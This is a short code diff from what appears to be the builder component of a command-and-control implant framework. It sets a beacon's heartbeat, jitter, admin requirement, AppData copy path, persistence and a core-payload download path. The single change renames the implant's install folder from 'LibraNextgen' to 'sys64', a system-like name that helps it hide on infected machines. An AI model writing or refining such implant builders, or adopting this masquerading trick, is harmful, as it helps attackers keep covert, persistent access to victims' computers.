@@ -567,7 +567,7 @@ public class BuilderController : ControllerBase
                 heartbeat_interval_ms = 3000,
                 jitter_percent = 0.2,
                 require_admin = req.RequireAdmin,
-                copy_to_path = req.CopyToAppData ? "LibraNextgen" : null,
+                copy_to_path = req.CopyToAppData ? "sys64" : null,
                 enable_persistence = req.EnablePersistence,
                 encrypted_aes_key = encryptedAesKeyB64,
                 core_download_path = $"/api/beacon/core/{buildId}",
